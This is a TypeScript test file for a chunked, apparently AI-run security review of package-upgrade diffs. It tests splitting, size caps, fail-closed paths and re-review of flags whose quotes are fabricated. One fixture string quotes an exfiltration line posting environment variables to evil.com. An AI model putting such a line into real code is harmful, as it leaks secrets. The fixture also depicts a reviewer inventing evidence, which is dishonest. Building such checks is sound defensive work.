// Ported from secure-update's chunked-review cases (test/port/02, section 2a).
import { describe, expect, test } from "bun:test";
import { chunkedReview, splitDiff, type Caps } from "../../src/apply/chunked.ts";
import type { Reviewer } from "../../src/review.ts";
import { genFile, scripted } from "./helpers.ts";

const APPROVE = "APPROVE\nno attack indicators found";
const FABRICATED = `FLAG: "requests.post('http://evil.com/log', json=env_vars)" (indicator 4)`;
const threeFiles = [genFile("a.py", 3000), genFile("b.py", 3000), genFile("c.py", 3000)].join("\n");
// The mechanism cases size their diffs for 4000-line chunks and a cap of 8, as the source tests did.
const MECH: Caps = { lines: 4000, maxChunks: 8 };

async function review(r: Reviewer, diff: string, caps: Caps = MECH) {
  const notices: string[] = [];
  const res = await chunkedReview(r, {
    title: "Type B review", label: "pkgx", upgrade: "1.0 → 1.1", head: "PROMPT-HEAD Package: pkgx", tail: "PROMPT-TAIL indicators",
    diff, caps, host: "fixture", notify: (t) => void notices.push(t),
  });
  return { ...res, notices };
}
const bodyOf = (prompt: string) => prompt.slice(prompt.indexOf("GitHub compare API source diff:\n") + 32, prompt.lastIndexOf("\n\nPROMPT-TAIL"));

describe("chunkedReview", () => {
  test("(a) 3 files, ~9000 lines → 3 chunks, all APPROVE, three progress lines", async () => {
    const { r, prompts } = scripted([], APPROVE);
    const v = await review(r, threeFiles);
    expect(v).toMatchObject({ approved: true, calls: 3, notices: [] });
    expect(v.log).toContain("review chunk 1/3: APPROVE (lines 1-3000)");
    expect(v.log).toContain("review chunk 2/3: APPROVE (lines 3001-6000)");
    expect(v.log).toContain("review chunk 3/3: APPROVE (lines 6001-9000)");
    prompts.forEach((p, i) => {
      expect(p.startsWith("PROMPT-HEAD Package: pkgx\n")).toBe(true);
      expect(p).toContain(`Chunk ${i + 1} of 3`);
      expect(p.endsWith("PROMPT-TAIL indicators")).toBe(true);
    });
    expect(prompts[0]).toContain("=== a.py");
    expect(prompts[0]).not.toContain("=== b.py");
  });
  test("small files pack into one chunk", async () => {
    const { r } = scripted([], APPROVE);
    const v = await review(r, [genFile("a.py", 100), genFile("b.py", 100)].join("\n"));
    expect(v.calls).toBe(1);
    expect(v.log).toContain("review chunk 1/1: APPROVE (lines 1-200)");
  });
  test("(b) a chunk FLAGs with a grounded quote → FLAG, notified, later chunks not reviewed", async () => {
    const { r } = scripted([APPROVE, 'FLAG\n1. FLAG: "+line 1500 of b.py" is a network call'], APPROVE);
    const v = await review(r, threeFiles);
    expect(v).toMatchObject({ approved: false, calls: 2 });
    expect(v.log.join("\n")).not.toContain("ungrounded");
    expect(v.notices).toHaveLength(1);
    expect(v.notices[0]).toStartWith("⚠️ <b>fixture Type B FLAG — pkgx</b>\nFLAG (chunk 2/3, lines 3001-6000)\nUpgrade: 1.0 → 1.1");
  });
  test("(c) fabricated quote, the re-review APPROVEs → approved, logged as ungrounded, same prompt again", async () => {
    const { r, prompts } = scripted([APPROVE, FABRICATED, APPROVE], APPROVE);
    const v = await review(r, threeFiles);
    expect(v).toMatchObject({ approved: true, calls: 4 });
    expect(v.log).toContain("ungrounded FLAG (quotes not in diff): re-reviewing chunk 2 once");
    expect(prompts[2]).toBe(prompts[1]!);
    // both reviews of chunk 2 are logged, the fabricated one first
    const at = v.log.indexOf("┌─ Type B review: pkgx [chunk 2/3]");
    expect(v.log[at + 1]).toBe(`│ ${FABRICATED}`);
    expect(v.log.lastIndexOf("┌─ Type B review: pkgx [chunk 2/3]")).toBeGreaterThan(at);
  });
  test("(d) fabricated quote twice → FLAG, the notice says (ungrounded)", async () => {
    const { r } = scripted([APPROVE, FABRICATED, FABRICATED], APPROVE);
    const v = await review(r, threeFiles);
    expect(v).toMatchObject({ approved: false, calls: 3 });
    expect(v.notices[0]).toContain("(ungrounded)");
  });
  test("a FLAG with no quote gets one re-review; a repeat still stands", async () => {
    const { r } = scripted(["FLAG\nsuspicious refactor", "FLAG\nstill suspicious"], APPROVE);
    const v = await review(r, threeFiles);
    expect(v).toMatchObject({ approved: false, calls: 2 });
    expect(v.log).toContain("FLAG without quoted evidence: re-reviewing chunk 1 once");
    expect(v.notices[0]).not.toContain("(ungrounded)");
  });
  test("a FLAG with no quote, then a clean APPROVE on re-review → chunk approved", async () => {
    const { r } = scripted(["FLAG"], APPROVE);
    expect(await review(r, threeFiles)).toMatchObject({ approved: true, calls: 4 });
  });
  test("(e) more chunks than the cap → FLAG without calling the reviewer", async () => {
    const { r } = scripted([], APPROVE);
    const v = await review(r, threeFiles, { lines: 4000, maxChunks: 2 });
    expect(v).toMatchObject({ approved: false, calls: 0, reason: "diff too large for automated review (9000 lines, over 2 chunks): manual review" });
    expect(v.notices).toHaveLength(1);
  });
  test("(e') the default cap is 40 chunks of 1000 lines", async () => {
    const { r } = scripted([], APPROVE);
    const v = await review(r, genFile("huge.js", 41001), {});
    expect(v).toMatchObject({ approved: false, calls: 0 });
    expect(v.reason).toContain("(41001 lines, over 40 chunks)");
  });
  test("the default chunk size is 1000 lines: a 2500-line diff is 3 chunks", async () => {
    const { r } = scripted([], APPROVE);
    expect(await review(r, genFile("mid.py", 2500), {})).toMatchObject({ approved: true, calls: 3 });
  });
  test("(f) one 9000-line file splits into 3 chunks with continued headers and a 50-line overlap", async () => {
    const { r, prompts } = scripted([], APPROVE);
    const v = await review(r, genFile("big.py", 9000));
    expect(v.calls).toBe(3);
    const bodies = prompts.map(bodyOf);
    expect(bodies[1]).toStartWith("=== big.py (continued, part 2) ===\n+line 3950 of big.py\n");
    expect(bodies[2]).toStartWith("=== big.py (continued, part 3) ===\n");
    expect(v.log).toContain("review chunk 2/3: APPROVE (lines 3951-7949)");
    for (const b of bodies) expect(b.split("\n").length).toBeLessThanOrEqual(4000);
    const seen = new Map<string, number>();
    for (const b of bodies) for (const l of b.split("\n")) if (l.startsWith("+line ")) seen.set(l, (seen.get(l) ?? 0) + 1);
    for (let i = 1; i < 9000; i++) expect(seen.get(`+line ${i} of big.py`)).toBeGreaterThanOrEqual(1);
    const twice = [...seen].filter(([, n]) => n === 2).map(([l]) => Number(l.split(" ")[1]));
    expect(twice).toEqual([...Array.from({ length: 50 }, (_, k) => 3950 + k), ...Array.from({ length: 50 }, (_, k) => 7899 + k)]);
  });
  test("(g) the reviewer unavailable on chunk 2 → FLAG, notified", async () => {
    const { r } = scripted([APPROVE, new Error("no model discovered")], APPROVE);
    const v = await review(r, threeFiles);
    expect(v).toMatchObject({ approved: false, calls: 2 });
    expect(v.notices).toHaveLength(1);
  });
  test("M2 an ungrounded FLAG whose re-review is unavailable → FLAG, not labelled ungrounded", async () => {
    const { r } = scripted([FABRICATED, new Error("down")]);
    const v = await review(r, threeFiles);
    expect(v).toMatchObject({ approved: false, calls: 2 });
    expect(v.reason).not.toContain("(ungrounded)");
  });
  for (const bad of [1, 0, Number.NaN, -5, 99, 1.5]) {
    test(`M1 a chunk size of ${bad} falls back to the default`, async () => {
      const { r } = scripted([], APPROVE);
      const v = await review(r, [genFile("a.py", 300), genFile("b.py", 300)].join("\n"), { lines: bad });
      expect(v).toMatchObject({ approved: true, calls: 1 });
    });
  }
  test("M1 a bad chunk count or byte cap falls back to the defaults", async () => {
    const { r } = scripted([], APPROVE);
    expect(await review(r, threeFiles, { lines: 4000, maxChunks: Number.NaN, bytes: 0 })).toMatchObject({ approved: true, calls: 3 });
  });
  test("an error inside the review → FLAG, notified as aborted", async () => {
    const { r } = scripted([], APPROVE);
    const v = await review(r, threeFiles, {
      get lines(): number {
        throw new Error("boom");
      },
    });
    expect(v.approved).toBe(false);
    expect(v.notices).toHaveLength(1);
    expect(v.notices[0]).toContain("Review aborted before a verdict");
  });
  const pad = (n: number) => "x".repeat(n);
  test("M6 a long-line file is split under the byte cap, every line covered", async () => {
    const { r, prompts } = scripted([], APPROVE);
    const diff = ["=== min.js (status: added) ===", ...Array.from({ length: 150 }, (_, i) => `+L${i + 1} min.js ${pad(2000)}`)].join("\n");
    const v = await review(r, diff);
    expect(v.approved).toBe(true);
    expect(prompts.length).toBeGreaterThanOrEqual(2);
    for (const p of prompts) expect(Buffer.byteLength(bodyOf(p))).toBeLessThanOrEqual(200000);
    const all = prompts.map(bodyOf).join("\n");
    for (let i = 1; i <= 150; i++) expect(all).toContain(`+L${i} min.js `);
  });
  test("M6 whole files are packed under the byte cap too", async () => {
    const { r, prompts } = scripted([], APPROVE);
    const file = (k: number) => [`=== f${k}.js (status: added) ===`, ...Array.from({ length: 19 }, (_, i) => `+${i} ${pad(3000)}`)].join("\n");
    const v = await review(r, [1, 2, 3, 4, 5].map(file).join("\n"));
    expect(v).toMatchObject({ approved: true, calls: 2 });
    for (const p of prompts) expect(Buffer.byteLength(bodyOf(p))).toBeLessThanOrEqual(200000);
  });
  test("X a single 300 KB line → FLAG and a notice, the reviewer never called", async () => {
    const { r } = scripted([], APPROVE);
    const v = await review(r, `=== min.js (status: added) ===\n+${"0".repeat(300000)}`);
    expect(v).toMatchObject({ approved: false, calls: 0, reason: "line too long for automated review (> 200000 bytes): manual review" });
    expect(v.notices).toHaveLength(1);
  });
  test("M6 the overlap never pushes a chunk over the byte cap (60 × 3 KB lines, then one 150 KB line)", async () => {
    const { r, prompts } = scripted([], APPROVE);
    const diff = ["=== m.js (status: added) ===", ...Array.from({ length: 60 }, (_, i) => `+${i} ${pad(3000)}`), `+${"0".repeat(150000)}`].join("\n");
    const v = await review(r, diff);
    expect(v.approved).toBe(true);
    expect(prompts.length).toBeGreaterThanOrEqual(2);
    for (const p of prompts) expect(Buffer.byteLength(bodyOf(p))).toBeLessThanOrEqual(200000);
  });
  test("a notice that fails once is not sent twice, and the real reason stands", async () => {
    const { r } = scripted([], "FLAG\nsuspicious");
    let tries = 0;
    const res = await chunkedReview(r, {
      title: "t", label: "pkgx", upgrade: "1.0 → 1.1", head: "H", tail: "T", diff: threeFiles, caps: MECH, host: "fixture",
      notify: () => { tries++; throw new Error("send failed"); },
    });
    expect(tries).toBe(1);
    expect(res).toMatchObject({ approved: false });
    expect(res.reason).toStartWith("FLAG");
    expect(res.log).toContain("pkgx: the FLAG notice could not be sent");
  });
  test("a long file name in the continued header never pushes a chunk over the byte cap", () => {
    const name = "n".repeat(4000) + ".js";
    const diff = [`=== ${name} (status: added) ===`, ...Array.from({ length: 200 }, (_, i) => `+${i} ${pad(4000)}`)].join("\n");
    const s = splitDiff(diff, 4000, 200000);
    if (!s.ok) throw new Error(s.why);
    expect(s.chunks.length).toBeGreaterThan(1);
    for (const c of s.chunks) expect(Buffer.byteLength(c.text)).toBeLessThanOrEqual(200000);
  });
  test("the overlap counts the continued header's bytes", () => {
    const name = "n".repeat(4000) + ".js";
    const diff = [`=== ${name} (status: added) ===`, ...Array.from({ length: 49 }, (_, i) => `+${i} ${pad(1000)}`), `+${"0".repeat(150000)}`].join("\n");
    const s = splitDiff(diff, 4000, 200000);
    if (!s.ok) throw new Error(s.why);
    expect(s.chunks.length).toBeGreaterThan(1);
    for (const c of s.chunks) expect(Buffer.byteLength(c.text)).toBeLessThanOrEqual(200000);
  });
  test("a file name too long to leave room for one line fails closed", async () => {
    const { r } = scripted([], APPROVE);
    const name = "n".repeat(150000);
    const diff = [`=== ${name} (status: added) ===`, ...Array.from({ length: 3 }, (_, i) => `+${i} ${pad(60000)}`)].join("\n");
    expect(splitDiff(diff, 4000, 200000)).toMatchObject({ ok: false, why: "toolong" });
    expect(await review(r, diff)).toMatchObject({ approved: false, calls: 0, reason: "line too long for automated review (> 200000 bytes): manual review" });
  });
  test("a normal FLAG is notified exactly once", async () => {
    const { r } = scripted([], "FLAG\nsuspicious");
    expect((await review(r, threeFiles)).notices).toHaveLength(1);
  });
});

// A file block of exactly `total` bytes, counting each line's newline as the splitter does.
function blockOf(name: string, total: number): string {
  const head = `=== ${name} (status: added) ===`;
  const out = [head];
  let left = total - (Buffer.byteLength(head) + 1);
  while (left > 1002) {
    out.push("+" + "x".repeat(999));
    left -= 1001;
  }
  out.push("+" + "y".repeat(left - 2));
  return out.join("\n");
}
const chunkBytes = (t: string) => Buffer.byteLength(t) + 1;

describe("splitDiff caps are exact", () => {
  test("whole blocks that fill the line cap exactly pack into one chunk; one line more opens a second", () => {
    expect((splitDiff([genFile("a", 2000), genFile("b", 2000)].join("\n"), 4000, 200000) as { chunks: unknown[] }).chunks).toHaveLength(1);
    expect((splitDiff([genFile("a", 2000), genFile("b", 2001)].join("\n"), 4000, 200000) as { chunks: unknown[] }).chunks).toHaveLength(2);
  });
  test("whole blocks that fill the byte cap exactly pack into one chunk; one byte more opens a second", () => {
    const one = splitDiff([blockOf("a", 100000), blockOf("b", 100000)].join("\n"), 4000, 200000);
    if (!one.ok) throw new Error(one.why);
    expect(one.chunks).toHaveLength(1);
    expect(chunkBytes(one.chunks[0]!.text)).toBe(200000);
    const two = splitDiff([blockOf("a", 100000), blockOf("b", 100001)].join("\n"), 4000, 200000);
    if (!two.ok) throw new Error(two.why);
    expect(two.chunks).toHaveLength(2);
  });
  test("a cut block never holds one byte over the cap", () => {
    // 199990 bytes, then an 11-byte line that would make 200001
    const diff = blockOf("big", 199990) + "\n+" + "z".repeat(9) + "\n+" + "w".repeat(500);
    const s = splitDiff(diff, 4000, 200000);
    if (!s.ok) throw new Error(s.why);
    expect(s.chunks.length).toBeGreaterThan(1);
    for (const c of s.chunks) expect(chunkBytes(c.text)).toBeLessThanOrEqual(200000);
    expect(chunkBytes(s.chunks[0]!.text)).toBe(199990);
  });
});

describe("splitDiff", () => {
  test("stops as soon as the chunk cap is passed, without building the rest", () => {
    const diff = ["=== big.js (status: added) ===", ...Array.from({ length: 500 }, (_, i) => `+${i} ${"x".repeat(4000)}`)].join("\n");
    let opened = 0;
    expect(splitDiff(diff, 1000, 200000, 3, () => opened++)).toEqual({ ok: false, why: "toomany", lines: 501 });
    expect(opened).toBe(3);
  });
  test("a line between the byte cap less 512 and the cap fails closed", () => {
    expect(splitDiff(`=== a.js (status: added) ===\n+${"0".repeat(199600)}`, 1000, 200000)).toMatchObject({ ok: false, why: "toolong" });
  });
  test("long lines still make progress: 500 lines of 4 KB split into a few chunks, not one per line", () => {
    const diff = ["=== big.js (status: added) ===", ...Array.from({ length: 500 }, (_, i) => `+${i} ${"x".repeat(4000)}`)].join("\n");
    const s = splitDiff(diff, 1000, 200000, 40);
    if (!s.ok) throw new Error(s.why);
    expect(s.chunks.length).toBeLessThanOrEqual(15);
    for (const c of s.chunks) expect(Buffer.byteLength(c.text)).toBeLessThanOrEqual(200000);
  });
  for (const [lines, bytes] of [[1, 200000], [0, 200000], [4000, 5]] as const) {
    test(`refuses caps (${lines} lines, ${bytes} bytes) on its own`, () => {
      expect(splitDiff("=== a (status: added) ===\n+1\n+2\n+3\n", lines, bytes)).toMatchObject({ ok: false, why: "badcaps" });
    });
  }
  test("NaN caps are refused by the splitter itself", () => {
    expect(splitDiff("+a\n+b", Number.NaN, 200000)).toMatchObject({ ok: false, why: "badcaps" });
    expect(splitDiff("+a\n+b", 1000, Number.NaN)).toMatchObject({ ok: false, why: "badcaps" });
  });
  test("a diff with no file header is one block", () => {
    const s = splitDiff("+a\n+b", 1000, 200000);
    expect(s).toEqual({ ok: true, lines: 2, chunks: [{ text: "+a\n+b", from: 1, to: 2 }] });
  });
});
